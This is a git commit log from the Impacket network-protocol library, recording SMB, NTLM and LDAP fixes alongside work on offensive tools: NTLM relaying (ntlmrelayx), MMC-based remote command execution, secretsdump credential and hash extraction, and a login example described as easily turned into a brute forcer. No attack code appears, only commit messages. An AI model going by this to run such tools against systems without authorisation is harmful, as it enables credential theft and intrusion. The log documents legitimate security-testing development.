commit 6ca48d58abafc2816696549f0b06157eda982b1c
Merge: e5b1968a 4152e128
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:55:35 2017 -0300

    Merge branch 'virtualenv-friendly' of https://github.com/martingalloar/impacket into martingalloar-virtualenv-friendly

commit 4152e128b8c1e435f04eb88775c290a86ebf266d
Author: Martin Gallo <mgallo@coresecurity.com>
Date:   Wed Jan 11 12:43:54 2017 -0300

    Replaced shebang with a virtualenv friendly one
    
    Replaced all instances of `#!/usr/bin/python` with `#!/usr/bin/env python` so impacket's examples and scripts can be run inside a virtualenv without having to call python.

commit e5b1968abcf2ed8cad2eef6d38531cc38ad98baa
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:42:11 2017 -0300

    VARIANT is already a pointer
    
    * Might solve https://github.com/CoreSecurity/impacket/issues/245. Testing needed

commit ea9f61d02ee4bb742313c2b90f6fb8bb7b237266
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 23:15:41 2017 -0300

    Quitting MMC when executing a single command from command-line
    
    * mmc.exe was still running at the target server

commit f4596a1b03e28eac4006288d07fd7c0662c29acf
Merge: a0f5bd26 0ff281f0
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 21:24:23 2017 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit a0f5bd265df61d1ba89901f93435eeb71242f045
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 10 21:23:22 2017 -0300

    Adding mmcexec.py example
    
    A similar approach to wmiexec but executing commands through MMC.
    
    Original discovery by Matt Nelson (@enigma0x3):
    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

commit 0ff281f00e2f563a8d5b68ef46ed375067d21fea
Author: martin_uy <m@rtin.uy>
Date:   Tue Jan 10 13:44:24 2017 -0300

    In the context of #244:
    
     * We are now cleaning up open files from the corresponding session structure in SMB3 when disconnecting from a tree.

commit aa1158726b75a74f62f76f8fde674547bd201ad6
Merge: 0ec5c1f0 72b5c5ce
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 9 15:28:56 2017 -0300

    Merge branch 'contactr2m-smb_com_nt_transact'

commit 72b5c5ce7894caac80539377596efb5cfdb163ed
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Fri Jan 6 13:05:19 2017 -0500

    Add support for SMB_COM_NT_TRANSACT and NT_TRANSACT_QUERY_SECURITY_DESC
    
    [MS-CIFS]: 2.2.4.62.1 SMB_COM_NT_TRANSACT request.
    [MS-CIFS]: 2.2.7.6.1 NT_TRANSACT_QUERY_SECURITY_DESC

commit f78c5e1731ceeafaaa9870a4b1b381e8ad1ddf20
Merge: 268a79a6 4c2a5b98
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Fri Jan 6 11:14:50 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit 4c2a5b98e54046e3dc65ce5410c35b63f27e4a70
Author: martin_uy <m@rtin.uy>
Date:   Tue Dec 27 13:49:51 2016 -0300

    In the context of #241:
     * The VCNumber field in a SMB_COM_SESSION_SETUP_ANDX binary packet (SMB login standard) is 2 bytes long. Truncate the os.getpid value if greater than 2 bytes.

commit 0ec5c1f0269415f54ff3cacfd6c495377e16b1bd
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 27 10:57:25 2016 -0300

    Adding SMBConnection.close()
    
    * Committing patch by @martinuy
    * Logs off and closes the underlying socket.
    * Should fix https://github.com/CoreSecurity/impacket/issues/227

commit c0610ef0c23cfcadaa8c861bc79089abc4400390
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 26 09:36:07 2016 -0300

    Hexdump for LSA Secrets not printed, if callback set
    
    * Small little trick to verify callback was not set (if there's a better way let me know)
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/240

commit d910f375973d5fff048cd12be720012b6b0a7be4
Merge: 2e9c5c2f ddf172bb
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Dec 12 10:24:44 2016 -0300

    Merge pull request #239 from CoreSecurity/dhcpoptions
    
    Adding 'default-url' to the dhcp options list.

commit ddf172bb13ace50794209f0603293b06bae1e127
Author: jgermano <jigermano@gmail.com>
Date:   Mon Dec 12 10:13:39 2016 -0300

    Adding 'default-url' to the dhcp options list. While not defined in any RFC, is assigned by IANA and accepted by, at least, Linux's dhclient.

commit 2e9c5c2f30b5fefb52c3db7f194ec57e7fbc31e6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 15:25:55 2016 -0300

    Adding -csv switch to output format in CSV
    
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/237

commit bf745b0e34124dabb5d1e7a4752160721fc2b06f
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 14:58:26 2016 -0300

    Adding PasswordLastSet, USER_DONT_EXPIRE_PASSWORD, USER_ACCOUNT_DISABLED and ScriptPath attributes
    
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/237

commit bf0ecc6ff893c3fe8e84d0d87f9e58e7c2b806d3
Merge: 2681d1f5 268a79a6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 10 12:01:47 2016 -0300

    Merge branch 'contactr2m-master'

commit 268a79a6de8c4c0913520793422e65dbd28611b3
Merge: 18e90dcc 6a21c7ea
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 14:01:35 2016 -0500

    Merge pull request #2 from contactr2m/#238-test_createdeleteDirectory
    
    Covers test for #238

commit 6a21c7eae2e5d099a4625e0456cc859ad75f23ed
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 13:45:56 2016 -0500

    Covers test for #238
    
    Test case test_createdeleteDirectory extended to include #238 case.

commit 18e90dcc26c317a742d66edb1ab52d8a7c53a89c
Merge: 2681d1f5 6750aae4
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 09:56:39 2016 -0500

    Merge pull request #1 from contactr2m/smb3.rmdir
    
    Implement SMB2_FILE_DISPOSITION_INFO in SMB3.rmdir() method.

commit 6750aae49067d063bc386f1c26fe7a6f538b7936
Author: Mani <contactr2m@gmail.com>
Date:   Thu Dec 8 09:52:23 2016 -0500

    Implement SMB2_FILE_DISPOSITION_INFO in SMB3.rmdir() method.
    
    Right now SMB3.rmdir() does not throw error STATUS_DIRECTORY_NOT_EMPTY when directory to be deleted is not empty.
    Instead it silently continues and returns success.
    Note that if the DELETE_ON_CLOSE flag is specified on a directory with child files or directories, the create operation will succeed, but the delete on close flag will be silently ignored when processing the cleanup IRP and the directory will not be deleted. http://go.microsoft.com/fwlink/?LinkId=140636

commit 2681d1f5de5c6122883a947bc57d431071f0beb5
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 6 12:53:34 2016 -0300

    Parse domain_name and TargetInfoFields based on their offsets and not after the Version field
    
    * This applies to NTLMAuthChallenge.
    * According to [MS-NLMP], Version field: 'A VERSION structure (as defined in section 2.2.2.10) that is populated only when the NTLMSSP_NEGOTIATE_VERSION flag is set in the NegotiateFlags field. This structure is used for debugging purposes only. In normal (non-debugging) protocol messages, it is ignored and does not affect the NTLM message processing.'
    * We found an instance of a server *not* setting the NTLMSSP_NEGOTIATE_VERSION and still having 8 bytes of random data as part of the version field.
    * At the same time [MS-NLMP] also states that: 'The Version field is NOT sent or accessed by Windows NT or Windows 2000. Windows NT and Windows 2000 assume that the Payload field started immediately after TargetInfoBufferOffset. Since all references into the Payload field are by offset from the start of the message (not from the start of the Payload field), Windows NT and Windows 2000 can correctly interpret messages with Version fields.'
    * Hence, we're using the offsets from now on to reference domain_name and TargetInfoFields
    * This should address https://github.com/CoreSecurity/impacket/issues/235

commit 2b61eedc6e2f58da8000faf3d49585273d02eade
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 5 18:32:16 2016 -0300

    Initializing self._Connection['Dialect'] to integer
    
    * Instead of ''. Dialects are numbers in SMB > 2 world.
    * Hopefully addresses https://github.com/CoreSecurity/impacket/issues/233

commit a446089a3f3dcac393dcfdd2e0b0a71a420ed9be
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 5 09:37:48 2016 -0300

    Don't count on CreditCharge to calculate SequenceWindow, when dialect is SMB 2.0.2
    
    * This should address https://github.com/CoreSecurity/impacket/issues/233, pending testing from the original
    reporter

commit a298662c7bc7afcf342839968d92a0e00e015ae3
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 2 11:36:53 2016 -0300

    Don't send a SMB2_NEGOTIATE packet if we already know the server's chosen dialect
    
    * Only sends it again if we receive a SMB2_DIALECT_WILDCARD dialect.
    * This hopefuly addresses the situation where the target server supports a single SMB2+ dialect so it doesn't need to return SMB2_DIALECT_WILDCARD. I think this would only happen for those SMB Servers that only support SMB2_DIALECT_002 (not entirely sure tho).
    * This should address a part of https://github.com/CoreSecurity/impacket/issues/233.

commit 38f7bac1fcb3a91eb3571566ea1ffca6d518fbc7
Merge: 563b757f 72f3a7c9
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 24 14:11:44 2016 -0300

    Merge branch 'fox-it-ntlmrelayx'

commit 72f3a7c974f8e4868a07908c3b2bdafd1ec6ea84
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 23 15:39:51 2016 +0100

    ntlmrelayx - relaying to IMAP

commit 563b757fba3af32655941edf5a35343300b173b2
Merge: 990e80b0 ab584ee8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 21 13:25:11 2016 -0300

    Merge pull request #231 from fox-it/ntlmrelayx
    
    Fix ntlmrelayx httprelayclient to support HTTPS urls

commit ab584ee81df86d17027f2d429b732205fd934793
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Nov 21 17:01:35 2016 +0100

    Fix httpclient to support HTTPS urls

commit 990e80b065688002de8ffb0b977a4bffd304c003
Author: asolino <bethus@gmail.com>
Date:   Wed Nov 16 14:13:59 2016 -0300

    When processing a WCHAR_ARRAY, add support for unichr()
    
    * In case we find Unicode chars
    * Might help solving https://github.com/CoreSecurity/impacket/issues/154

commit 2bc68df37e5689deb2c46c9d47c37011c49e714d
Merge: 07e2377c 43dde14f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Nov 16 12:42:52 2016 -0300

    Merge pull request #229 from fox-it/ntlmrelayx
    
    Ntlmrelayx bugfixes

commit 43dde14fd126b615516fd13956f66bd18500f4c4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 16 16:40:11 2016 +0100

    ntlmrelayx compatibility with ldap3 v2 and newer

commit 0da9b84f9f8935271b35a0e12e1d04b868e55ae4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Nov 16 13:06:16 2016 +0100

    LDAP attack improvements

commit 07e2377c790da8180ecafd1bdff9cb735d6c0a6c
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:42:16 2016 -0300

    Adding -user-status support for DRSUAPI mode
    
    * Completes what was done at https://github.com/CoreSecurity/impacket/pull/222

commit 6c44e5bdd4dd3299c8966de6a7b57e019ccca1fd
Merge: d62efb7c 036e5bd7
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:21:07 2016 -0300

    Merge branch 'shab4z-master'

commit 036e5bd77852eb2b4152eb463eddc5e2b2bfd11d
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 24 21:19:24 2016 -0300

    Adding a -user-status display option
    
    * Changing the (current-disabled) to (status=Enabled/Disabled)
    * Moving that data to the end of the line, in alignment to the pwd-last-set display option
    * Only supportted in VSS mode. DRSUAPI coming soon

commit 5aab86a05918cbcbf8fcd5204a11e425693e0e52
Author: Slim MERIAH <smeriah@lexsi.com>
Date:   Mon Oct 24 13:52:24 2016 +0200

    Little check for enabled/disabled users.

commit d62efb7c8c87c9393caf33877e1cd9d21732e5f5
Merge: 2485f164 9c94160f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 20 16:18:30 2016 -0300

    Merge pull request #220 from the-useless-one/ldap_utf8
    
    Don't try to encode the LDAP filter if it's already in unicode

commit 2485f164fd67ebf957df7082f4ad50f5018c807d
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 19 13:34:43 2016 -0300

    Fixes anonymous connection flags.
    
    * We shouldn't specify we're sending username / password when we're not.

commit 8cef002928ca52be4e9476a87a54d836b5efa81e
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 18 15:22:21 2016 -0300

    Adding MQTT basic structures and example
    
    * Minimalistic MQTT implementation, just focused on connecting, subscribing and publishing
      basic messages on topics.
    * Simple MQTT example aimed at playing with different login options. Can be converted into
      a account/password brute forcer quite easily.

commit 9c94160fac1c2547aa92e8553efe89247999a5a8
Author: Yannick Méheut <yannick@meheut.org>
Date:   Wed Oct 12 11:50:49 2016 +0200

    If the ldap filter is already in UTF8, leave it as is

commit f35117e184438e747c0ba372ea3ef8f41d9a5d73
Merge: 10b94e4e 40e64714
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 7 10:11:02 2016 -0300

    Merge branch 'fox-it-ntlmrelayx-interactive'

commit 40e6471434f849fcbab769a668a8ff5cb45fa068
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Thu Oct 6 22:33:12 2016 +0200

    Added interactive SMB console via local socket

commit 13843229ab90236742124330c72fd931cb5d06b8
Merge: 9739ade5 10b94e4e
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Thu Oct 6 19:15:29 2016 +0200

    Merge branch 'master' of github.com:CoreSecurity/impacket into ntlmrelayx-interactive

commit 10b94e4e20570a168e2e60c9b91e3a454de69a23
Merge: 0afacbea dadc4ebc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 5 11:19:09 2016 -0300

    Merge pull request #218 from Gifts/master
    
    Small fixes for NTLMRelayX http client module

commit dadc4ebc227f1ad976730bbe3dbbab6dda2437e1
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Wed Oct 5 16:52:27 2016 +0300

    Fix parsing NTLM challenge when multiple WWW-Authenticate headers are sent

commit f5a59ac408c683409a1db6ded51c3b92dafc338e
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Wed Oct 5 16:29:35 2016 +0300

    Fix paths with multiple "/" in them

commit 0afacbea5a13f3bf5fb9e860ab3d3c712ef8a315
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 4 19:58:43 2016 -0300

    Adding GetADUsers.py example script
    
    This script will gather data about the domain's users and their corresponding email addresses. It will also
    include some extra information about last logon and last password set attributes.
    You can enable or disable the the attributes shown in the final table by changing the values in line 184 and
    headers in line 190.
    If no entries are returned that means users don't have email addresses specified.

commit c1e5842c2105490a5c9f763a700cd4b8e87274ec
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 4 16:04:51 2016 -0300

    Fixes NTLM anonymous issue authentication against W2k3
    
    * It might solve https://github.com/CoreSecurity/impacket/issues/216, although not sure yet since I cannot reproduce the full issue (I still get ACCESS_DENIED after anonymous login)

commit 9739ade5747018b45a9ffe425374d8d620fa4dde
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Mon Oct 3 21:26:00 2016 +0200

    Some more leftovers

commit 8af1ed5715756cfbd2ec6b81c12e1b87dc7b524b
Author: Dirk-jan <dirkjan@sanoweb.nl>
Date:   Mon Oct 3 21:22:38 2016 +0200

    Fix legacy config inconsistencies

commit f9652789d405557c782a1fd7c31add6b526c5c7d
Merge: bcd75b08 42165dde
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 20:06:10 2016 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit bcd75b080edcbf090ac95e8b96d73d4f2d52dd7f
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 20:04:33 2016 -0300

    Attempting to address situations where TSO (TCP segmentation offload) is present
    
    * I'm not entirely sure this is the right approach to solve this use case. Testing needed.

commit 42165ddee85832810ff3fc282ac8aa4560b0e3a5
Merge: 0c8e7926 66e28da7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 21 15:23:54 2016 -0300

    Merge pull request #209 from blark/master
    
    Update ntlmrelayx.py to fix domain dump bug

commit 66e28da76f4c022e518ffc3274d2969a05e998ee
Author: blark <info@baseggio.ca>
Date:   Wed Sep 21 14:22:29 2016 -0400

    Update ntlmrelayx.py to fix domain dump bug
    
    The boolean `dumpedDomain` was being assigned after the completion of a domain dump. This can take quite some time on a large domain, meaning that every time a new request is processed the domain dump starts again (until the first dump is finished). This minor tweak should fix that.

commit 0c8e7926d1474f18d653cad543ded6917cd37394
Merge: 52279744 81ffe50c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 21 15:21:18 2016 -0300

    Merge pull request #208 from blark/master
    
    Updated requirements section

commit 81ffe50cbecf64c165fb8a264dec2cb2420578ae
Author: blark <info@baseggio.ca>
Date:   Wed Sep 21 14:17:13 2016 -0400

    Updated requirements section
    
    Added ntlmrelayx requirements and tweaked lines to match style

commit 52279744e8bf9c5895fc3339dc8fa4541840f45b
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 21 11:13:53 2016 -0300

    Fixing typo with PCAP MAGIC and Structure

commit 0e68c7ecc37c7b702168db75fcf6f1f041ca9e43
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 20:11:15 2016 -0300

    Honoring SMBConnection.myName parameter when doing NTLM handshake
    
    * If you create a SMBConnection object and specify a myName parameter, it will be populated in the NTLM_AUTH_MESSAGE
    * However, it will NOT be sent in the NTLM_NEGOTIATE message since modern Windows clients don't populated that information.
    * DCERPC connection are not yet supported
    * Partially addresses https://github.com/CoreSecurity/impacket/issues/207

commit d2cbe3c2606bd16e628858baae6483e8dd48ed3c
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:40:30 2016 -0300

    Adding code to handle IGMP packet
    
    * Applying patch from @nixotic
    * Addresses https://github.com/CoreSecurity/impacket/issues/30

commit bc05ee3522af7854400b00df40d421a0838a9a59
Merge: 7694e67a db8d2914
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:28:20 2016 -0300

    Merge branch 'xelphene-master'

commit db8d291490e77685dd7abcd06f4b99dbf5c0feb9
Merge: 7694e67a 8dbf234b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 14:25:14 2016 -0300

    Merge branch 'master' of https://github.com/xelphene/impacket into xelphene-master

commit 7694e67a9fab4de3cfb13b6924718d69af8e2979
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 10:26:11 2016 -0300

    Minor cosmetic changes

commit 42b447229fe9ed887d91d75df17c57f422963e24
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 19 09:55:16 2016 -0300

    Checking password field is not None when calling getNTLMSSPType3
    
    * If so, we convert it to '', hoping hashes were provided.
    * Indirectly addresses https://github.com/CoreSecurity/impacket/issues/206

commit 8dbf234ba38030e2914379015db743ac828a2bb3
Merge: 0de3c24e c049506e
Author: Steve Benson <steve@xelphene.net>
Date:   Fri Sep 16 00:11:12 2016 -0400

    Merge https://github.com/CoreSecurity/impacket
    
    Conflicts:
            examples/wmiexec.py

commit 0de3c24e058c36a2db8173da94be3af88f0fdfca
Author: Steve Benson <steve@xelphene.net>
Date:   Wed Sep 14 06:59:48 2016 -0400

    Added a -A option to load credentials from an smbclient/mount.cifs style
    authentication file.

commit c049506e43ffa4c76dca7c676822ada7182f8288
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 23:54:50 2016 -0300

    Minor cosmetic changes

commit 01b0ae8e936ec4ead94fbd55d739603fd6f46f34
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 23:15:23 2016 -0300

    Better error control
    
    * We should re-write ServiceInstall tho.. It's kind of messy

commit d103ea7d0e50c7096d4f038d90d9162e302636b4
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 13 22:06:12 2016 -0300

    Removing uneccesary imports

commit a483bfbca950e1b205543fd28452b0cc5e68bb2c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 12:00:31 2016 -0300

    Printing NTLM hashes as we get them and we keep the rest to the end
    
    * Basically NTLM Hashes printed as they come
    * Kerberos keys and cleartext password as printed after the NTLM hashes
    * Aimed at making the output more readable

commit d2e4aacf477387a2a3efb4ee359aecf79505e1ee
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:32:39 2016 -0300

    Adjusting variables to the naming convention already used

commit 473f3f107582347fd4df82d736ad68e5d71c88e6
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:17:57 2016 -0300

    Importing classes from the library instead of the example
    
    * In case the example's not present

commit e79b5e26cf387e94a50c1d51c9a65b5e11895870
Merge: 3e194c65 372b7e25
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:06:28 2016 -0300

    Merge branch 'martinuy-secrets_dump_refactoring'

commit 372b7e25749464785f2488c1a41323c30d0e3893
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 11:04:22 2016 -0300

    No need to convert argument to string
    
    * In fact it might trigger an exception when dealing with Unicode strings (e.g. an user with non ASCII chars)

commit b4c819b99f758419f13884a72d6ad15c96b9c1f3
Merge: 3e194c65 8701c37b
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 9 10:41:12 2016 -0300

    Merge branch 'secrets_dump_refactoring' of https://github.com/martinuy/impacket into martinuy-secrets_dump_refactoring

commit 8701c37bb09e491e2264ad3664be367dd4cedb3d
Author: martin_uy <m@rtin.uy>
Date:   Fri Sep 9 10:22:24 2016 -0300

    Resources cleanup (files closing) when dumping NTDS hashes.

commit 1ca14b97f478789ea2405946022fab6f9bd31f5a
Author: martin_uy <m@rtin.uy>
Date:   Fri Sep 9 10:12:44 2016 -0300

    Constant replacement.

commit 5819161f6846d3cbd8295d81373f014bd1b0ab84
Author: martin_uy <m@rtin.uy>
Date:   Thu Sep 8 21:10:18 2016 -0300

    A callback per secret was added to extract information out of Secrets Dump library component. A "print" default callback keeps the previous behaviour by default.

commit 3e194c6540d41f7d231e0de28f305572cae541f7
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 8 11:52:00 2016 -0300

    Removing references to deprecated SMBBackwardCompatibilityTransport class
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/203

commit 87dd64e4da23ee9af838ef181f591b2309003ede
Author: martin_uy <m@rtin.uy>
Date:   Thu Sep 8 11:09:49 2016 -0300

    Secrets Dump library component is now using the Impacket's logging idiom.

commit 3d4944afc76a145643595d4f825e247ed8ee0ba8
Author: martin_uy <m@rtin.uy>
Date:   Wed Sep 7 20:45:48 2016 -0300

    Secrets Dump example split into 2 components. Secrets extraction component moved to Impacket library as an example. Command line interface component remains out of Impacket library.

commit c8aabf2810857032c2f944edfb8ca931ecf3889a
Author: Michael Niewoehner <mniewoeh@stud.hs-offenburg.de>
Date:   Thu Sep 17 15:52:12 2015 +0200

    Adding Decoders for BOOTP and DHCP

commit 2a4195d416aa67771bbe27aec629076bfe1e0253
Merge: 609ddf3e 488fddd1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 7 12:54:20 2016 -0300

    Merge pull request #89 from DiGMi/master
    
    Adding ERP and Country elements to Beacon

commit 609ddf3e5626ec32e42ba8826ed4bb8b7d7955a3
Merge: ce72d09c a934c89e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 7 12:51:55 2016 -0300

    Merge pull request #91 from c0d3z3r0/feature/eap
    
    Add EAPOLDecoder to EthDecoder

commit ce72d09cbce787839584b2566cf9d6323048872e
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 6 17:49:00 2016 -0300

    Minor class refactor
    
    * Created LocalOperations class to encapsulate some offline registry specific operations.
    * Now DumpSecrets is cleaner, and just handles the instances created based on the scripts parameters set by the user

commit bac6ad7f50ffe894d64055b4fc1eeff48051b059
Merge: 7801e11d 3221e344
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 6 12:27:42 2016 -0300

    Merge pull request #202 from fox-it/ntlmrelay-fixes
    
    ntlmrelayx improvements

commit 3221e34440e2ab09f46baa3005f1c923a66983f0
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Sep 6 16:50:11 2016 +0200

    ntlmrelayx improvements

commit 7801e11d9906e105f0ec369cf0fe88f5d131afc5
Merge: af697dcf 0325289b
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 5 12:27:44 2016 -0300

    Merge branch 'kacpern-ldap-dev'

commit 0325289b45feb28d7cbc21324dda14945c202c27
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Mon Sep 5 17:24:09 2016 +1000

    changed default classes to a mixin

commit df5b231da10ff84a506905d442256e987d7103ef
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Mon Sep 5 15:16:38 2016 +1000

    minor changes and refactoring
    * slightly changed search method definition
    * added pretty printing of control values

commit a934c89ea2badc89f8c5e5175a49e6e199cf36a6
Author: Michael Niewoehner <mniewoeh@stud.hs-offenburg.de>
Date:   Wed Sep 16 10:21:16 2015 +0200

    Add EAPOLDecoder to EthDecoder to get the decoded EAPOL packet from child()

commit d63ff2368791e415aca73922174b9a762157c32c
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Fri Sep 2 10:42:21 2016 +1000

    reverted str.format() to %s
    reverted str.decode() to unhexlify()
    fixed my primitive obsession
    additional refactoring

commit 7799329097a2b825ca75e3ebe4223ce74c9a4478
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 15:13:10 2016 +1000

    formatting fix

commit da8c405e008a358aa6514bd317602b5f1dc7bc63
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 15:00:15 2016 +1000

    rudimentary checks for simple authentication

commit c652c0f7a733861784bd6cfbd90d9deebaa7e999
Merge: 8aba596b af697dcf
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Sep 1 14:26:52 2016 +1000

    Merge branch 'master' into ldap-dev

commit 8aba596bf329e87a7260deafec012dc2fdcad77f
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 31 16:13:49 2016 +1000

    working on ldap and ldapasn1 cleanup

commit af697dcf9550684f05f6ea50037910a825c8bc10
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 29 11:57:31 2016 -0300

    Avoiding infinite loop when opening some ESE databases
    
    * We're giving up if FirstAvailablePageTag is <=1 (as opposed to just == 1)
    * Fixes https://github.com/CoreSecurity/impacket/issues/199

commit db125046eda94f75051a28ef83fce24b5ca98bd5
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 25 21:32:51 2016 -0300

    Adding Author Attribution
    
    * Based on the amount of code committed on those files.

commit 6ecaa8a7bcb065f6f7ffc007e9dda2705aa6baeb
Merge: fc4d2a15 81fe930e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 25 21:13:22 2016 -0300

    Merge pull request #197 from kacpern/ldap-approxmatch
    
    pretty handling of unsolicited notifications

commit 81fe930ea69a237a109268da58e2ef49319ace30
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Fri Aug 26 10:08:34 2016 +1000

    implemented handling of nnsolicited notification

commit fc4d2a15d35cb06a1949f1ce95c01a96f9d289a5
Merge: 311b5ba0 be48469e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Aug 25 21:05:52 2016 -0300

    Merge pull request #196 from kacpern/ldap-approxmatch
    
    fix tagSet for approxMatch (#195)

commit 311b5ba09454098c6a3441aa082e05269ea1ef03
Author: asolino <bethus@gmail.com>
Date:   Thu Aug 25 14:04:51 2016 -0300

    Removing unused imports
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/187

commit be48469e18efa39b8a1b911029bca159aa1b3fca
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:57:44 2016 +1000

    implemented handling of nnsolicited notification

commit b4808fcca418b66395edb830e86492767c06f1bd
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:56:36 2016 +1000

    implemented handling of nnsolicited notification

commit c523e9462932190139d3067d20ba3c9f1959f2ef
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:25:11 2016 +1000

    formatting

commit bed4b2db64e804dbfb14c04169903e48e49a2cbc
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Thu Aug 25 18:13:28 2016 +1000

    * fix tagSet for approxMatch (#195)
    * add extendedResult to ldapasn1
    * add fix for AD nonconformity with RFC

commit 8af9271f656b6d420466f8bcaec8b81253388340
Merge: da6086a4 db48476f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 24 09:46:39 2016 -0300

    Merge pull request #194 from kacpern/ldap-paging
    
    changing names

commit db48476f523a2f7509f2736cd16bb564bd4d5663
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:21:25 2016 +1000

    fixing bad names

commit 3484373aca5fceb2866b1ea455678e04c5b02533
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:18:30 2016 +1000

    fixing bad names

commit ecccf3b26bfa71ddca6dad6e84beb50866dd4a55
Author: Kacper Nowak <kacper.p.nowak@gmail.com>
Date:   Wed Aug 24 16:13:40 2016 +1000

    fixing bad names

commit da6086a4a40e7349c36300496d56493ebdff696f
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 23 12:55:50 2016 -0300

    Removing unused code
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/187

commit b8ef63da351cc24e812624e1294d930f89b3578c
Merge: f330e78b 0c9b64a5
Author: asolino <bethus@gmail.com>
Date:   Tue Aug 23 11:48:31 2016 -0300

    Merge branch 'kacpern-ldap-paging'

